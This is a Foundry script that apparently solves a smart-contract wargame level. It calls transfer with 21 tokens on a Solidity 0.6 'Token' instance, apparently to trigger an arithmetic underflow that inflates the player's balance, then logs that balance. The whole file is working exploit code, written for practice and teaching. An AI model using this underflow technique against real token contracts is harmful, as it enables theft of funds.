// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "../instance/Level5.sol";
import "forge-std/Script.sol";

contract ExploitLevel5 is Script {
    Token instance = Token(0x21d06aC321053C031aefd719D08f86A3aaf7723d);
    address player = 0x9606e11178a83C364108e99fFFD2f7F75C99d801;

    function run() external {
        vm.broadcast(vm.envUint("PRIVATE_KEY"));
        instance.transfer(address(0), 21);

        console.log("player's balance:", instance.balanceOf(player));
    }
}
